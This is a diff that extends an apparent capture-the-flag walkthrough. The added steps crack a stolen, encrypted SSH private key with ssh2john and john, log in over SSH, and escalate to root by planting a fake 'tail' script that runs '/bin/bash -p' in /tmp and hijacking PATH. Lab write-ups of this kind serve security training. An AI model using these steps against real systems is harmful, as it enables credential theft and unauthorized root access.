@@ -100,8 +100,41 @@ We can modiy the payload we used earlier and include ``'file:///home/username/.s
 ![ssh_key](https://user-images.githubusercontent.com/20625004/187399534-60c4bc80-1c86-4781-9d97-181548da779f.PNG)
 
 
-Now we found the users ssh key. Copy the whole key to a file on your machine machine. The key is ENCRYPTED, and password protected. 
-We need to use ``ssh2john`` tool and the crack it with ``john``.
+Now we found the users ssh key. Copy the whole key (lets call it id_rsa) to a file on your machine machine. The key is ENCRYPTED, and password protected. 
+We need to use ``ssh2john`` tool and the crack it with ``john``. 
 
+First we need to convert to a hash that ``john`` can use it to crack it.
+
+``ssh2john id_rsa > hash ``  then ``john hash --wordlist=/path/to/wordlist/``.
+
+![cracked](https://user-images.githubusercontent.com/20625004/187400508-a34b125c-9261-4ee1-8126-4068f9283197.PNG)
+
+Change permission on the file id_rsa we created earlier ``chmod 700 id_rsa``.
+
+With that password logg in via ``SSH``. 
+
+``ssh -i id_rsa username@targetip``.
+
+Sucess we enterd and on the users home directory you can find the first flag.
+
+![user_flag](https://user-images.githubusercontent.com/20625004/187401613-e31f17b2-09f9-4011-958e-0f1a36bdf89e.PNG)
+
+On second's user home directory there is a file ``/home/username/live_log``.
+
+![live](https://user-images.githubusercontent.com/20625004/187402273-23df595e-d136-486c-abf0-c59a53da6fd5.PNG)
+
+To further inspect the file we use commands ``file`` and ``strings``.
+
+We observer that the binary executed the ``tail`` command to show the content of the ``/var/log/nginx/access.lo`` file. In order to exploit it, we
+need to go ``/tmp`` folder, and create a ``tail`` file and  spawn a new bash instance, and added this one to the path and executed it again.
+
+```#!/bin/bash
+
+/bin/bash -p
+```
+
+Make the file we created executable ``chmod +x /tmp/tail``.
+
+![flag_second](https://user-images.githubusercontent.com/20625004/187403642-b467b8ec-b41e-4173-8f70-91de7dace971.PNG)
 
 
